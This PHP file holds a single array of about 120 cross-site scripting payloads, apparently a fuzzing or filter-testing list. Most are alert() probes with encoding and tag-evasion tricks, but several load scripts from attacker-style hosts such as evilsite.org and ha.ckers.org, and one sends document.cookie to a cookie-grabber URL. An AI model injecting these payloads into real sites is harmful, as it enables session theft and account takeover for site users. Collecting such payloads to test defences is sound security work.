<?php

$sheet = array(
    '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
    '\"><script>alert(0)</script>',
    '<script src=http://yoursite.com/your_files.js></script>',
    '</title><script>alert(/xss/)</script>',
    '</textarea><script>alert(/xss/)</script>',
    '<IMG LOWSRC=\"javascript:alert(\'XSS\')\">',
    '<IMG DYNSRC=\"javascript:alert(\'XSS\')\">',
    '<font style=\'color:expression(alert(document.cookie))\'>',
    '<img src=\"javascript:alert(\'XSS\')\">',
    '<script language=\"JavaScript\">alert(\'XSS\')</script>',
    '[url=javascript:alert(\'XSS\');]click me[/url]',
    '<body onunload=\"javascript:alert(\'XSS\');\">',
    '<script>alert(1);</script>',
    '<script>alert(\'XSS\');</script>',
    '<script src=\"http://www.evilsite.org/cookiegrabber.php\"></script>',
    '<script>location.href=\"http://www.evilsite.org/cookiegrabber.php?cookie=\"+escape(document.cookie)</script>',
    '<scr<script>ipt>alert(\'XSS\');</scr</script>ipt>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=foo.png onerror=alert(/xssed/) />   ',
    '<style>@import\'javascript:alert(\"XSS\")\';</style>   ',
    '<? echo(\'<scr)\'; echo(\'ipt>alert(\"XSS\")</script>\'); ?>   ',
    '<marquee><script>alert(\'XSS\')</script></marquee>   ',
    '<IMG SRC=\"jav&#x09;ascript:alert(\'XSS\');\">   ',
    '<IMG SRC=\"jav&#x0A;ascript:alert(\'XSS\');\">   ',
    '<IMG SRC=\"jav&#x0D;ascript:alert(\'XSS\');',
    '<body onLoad=\"alert(\'XSS\');\"   ',
    '[color=red\' onmouseover=\"alert(\'xss\')\"]mouse over[/color] ',
    '\"/></a></><img src=1.gif onerror=alert(1)>',
    'window.alert(\"Bonjour !\");   ',
    '<div style=\"x:expression((window.r==1)?\'\':eval(\'r=1;   ',
    'alert(String.fromCharCode(88,83,83));\'))\">   ',
    '<iframe<?php echo chr(11)?> onload=alert(\'XSS\')></iframe>   ',
    '\"><script alert(String.fromCharCode(88,83,83))</script>   ',
    '\'>><marquee><h1>XSS</h1></marquee>   ',
    '\'\">><script>alert(\'XSS\')</script>   ',
    '\'\">><marquee><h1>XSS</h1></marquee>   ',
    '<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(\'XSS\');\">   ',
    '<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert(\'XSS\');\">   ',
    '<script>var var = 1; alert(var)</script>   ',
    '<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert(\'XSS\')\")}</STYLE>   ',
    '<?=\'<SCRIPT>alert(\"XSS\")</SCRIPT>\'?>   ',
    '<IMG SRC=\'vbscript:msgbox(\"XSS\")\'>   ',
    '\" onfocus=alert(document.domain) \"> <\"   ',
    '<FRAMESET><FRAME SRC=\"javascript:alert(\'XSS\');\"></FRAMESET>   ',
    '<STYLE>li {list-style-image: url(\"javascript:alert(\'XSS\')\");}</STYLE><UL><LI>XSS   ',
    'perl -e \'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";\' > out   ',
    'perl -e \'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";\' > out   ',
    '<br size=\"&{alert(\'XSS\')}\">   ',
    '<scrscriptipt>alert(1)</scrscriptipt>   ',
    '</br style=a:expression(alert())>   ',
    '</script><script>alert(1)</script> ',
    '<SCRIPT>document.write(\"XSS\");</SCRIPT>   ',
    'a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert(\'xss\');\";eval(a+b+c+d);   ',
    '=\'><script>alert(\"xss\")</script>',
    '<script+src=\">\"+src=\"http://yoursite.com/xss.js?69,69\"></script>   ',
    '<body background=javascript:\'\"><script>alert(navigator.userAgent)</script>></body>   ',
    '\">/XaDoS/><script>alert(document.cookie)</script>',
    '<script>  src=\"http://www.site.com/XSS.js\"></script>   ',
    '\">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>   ',
    'src=\"http://www.site.com/XSS.js\"></script> ',
    '\"><BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert(\"XSS\")>   ',
    '[color=red width=expression(alert(123))][color]   ',
    '<BASE HREF=\"javascript:alert(\'XSS\');//\">   ',
    'Execute(MsgBox(chr(88)&chr(83)&chr(83)))<   ',
    '\"></iframe><script>alert(123)</script>   ',
    '<body onLoad=\"while(true) alert(\'XSS\');\">   ',
    '\'\"></title><script>alert(1111)</script>   ',
    '</textarea>\'\"><script>alert(document.cookie)</script>   ',
    '\'\"\"><script language=\"JavaScript\"> alert(\'X nS nS\');</script>   ',
    '</script></script><<<<script><>>>><<<script>alert(123)</script>  ',
    '<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert(\'XSS\');\">   ',
    '\'></select><script>alert(123)</script>   ',
    '\'>\"><script src = \'http://www.site.com/XSS.js\'></script>   ',
    '}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>',
    '<html><noalert><noscript>(123)</noscript><script>(123)</script>',
    '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
    '<IMG SRC=javascript:alert(\'XSS\')>',
    '<IMG SRC=\"javascript:alert(\'XSS\');\">',
    '<IMG SRC=`javascript:alert(\"RSnake says, \'XSS\'\")`>',
    '<IMG SRC=\"jav	ascript:alert(\'XSS\');\">',
    '<IMG SRC=\"jav&#x09;ascript:alert(\'XSS\');\">',
    '<IMG SRC=\"jav&#x0A;ascript:alert(\'XSS\');\">',
    '<IMG SRC=\"jav&#x0D;ascript:alert(\'XSS\');\">',
    '<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert(\"XSS\")>',
    '<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',
    '<<SCRIPT>alert(\"XSS\");//<</SCRIPT>',
    '<SCRIPT SRC=//ha.ckers.org/.j>',
    '<IMG SRC=\"javascript:alert(\'XSS\')\"',
    '<iframe src=http://ha.ckers.org/scriptlet.html <',
    '\";alert(\'XSS\');//',
    '</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>',
    '<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert(\'XSS\');\">',
    '<BODY BACKGROUND=\"javascript:alert(\'XSS\')\">',
    '<IMG DYNSRC=\"javascript:alert(\'XSS\')\">',
    '<IMG LOWSRC=\"javascript:alert(\'XSS\')\">',
    '<STYLE>li {list-style-image: url(\"javascript:alert(\'XSS\')\");}</STYLE><UL><LI>XSS</br>',
    '<IMG SRC=\'vbscript:msgbox(\"XSS\")\'>',
    '<IMG SRC=\"livescript:[code]\">',
    '<BODY ONLOAD=alert(\'XSS\')>',
    '<BGSOUND SRC=\"javascript:alert(\'XSS\');\">',
    '<BR SIZE=\"&{alert(\'XSS\')}\">',
    '<LINK REL=\"stylesheet\" HREF=\"javascript:alert(\'XSS\');\">',
    '<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">',
    '<STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE>',
    '<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">',
    '<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>',
    '<STYLE>@import\'javascript:alert(\"XSS\")\';</STYLE>',
    '<IMG STYLE=\"xss:expr/*XSS*/ession(alert(\'XSS\'))\">',
    '<STYLE>.XSS{background-image:url(\"javascript:alert(\'XSS\')\");}</STYLE><A CLASS=XSS></A>',
    '<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert(\'XSS\')\")}</STYLE>',
    '<XSS STYLE=\"xss:expression(alert(\'XSS\'))\">',
    '<XSS STYLE=\"behavior: url(xss.htc);\">',
    '<a <!-- --> href="j&#x61;vascript:&#x61;lert(-1)">hello</a>',
    '<a href="j&#x61;vascript:&#x61;lert(-1)"',
    '<a href="j&#00097;vascript:alert%252831337%2529">Hello</a>',
    '<a <!-- href="j&#x61;vascript:&#x61;lert&#x28;31337&#x29;;">Hello</a>',
    '<img src="http://www.w3schools.com/tags/planets.gif" width="145" height="126" alt="Planets" usemap="#planetmap"><map name="planetmap"><area shape="rect" coords="0,0,145,126" a-=">" href="j&#x61;vascript:&#x61;lert(-1)"></map>',
    '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
    '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
    '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
    '" onhover="j&#x61;vascript:&#x61;lert(-1)"',
    '"><script>alert(\'test\')</script>'
);